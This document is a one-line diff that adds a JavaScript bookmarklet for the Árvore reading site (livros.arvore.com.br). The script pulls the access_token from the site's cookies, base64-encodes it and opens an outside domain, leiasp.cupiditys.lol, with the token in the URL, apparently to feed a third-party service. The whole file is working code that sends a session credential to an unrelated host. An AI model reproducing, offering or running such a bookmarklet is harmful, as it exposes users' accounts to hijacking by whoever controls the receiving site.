@@ -1,0 +1,1 @@
+javascript:!function(){if('livros.arvore.com.br'!==location.host)return alert('Este script s%C3%B3 funciona no %C3%81rvore!');open(`https://leiasp.cupiditys.lol/?key=${encodeURIComponent(btoa(document.cookie.split(%27access_token=%27)[1].split(%27;%27)[0]))}`)}();
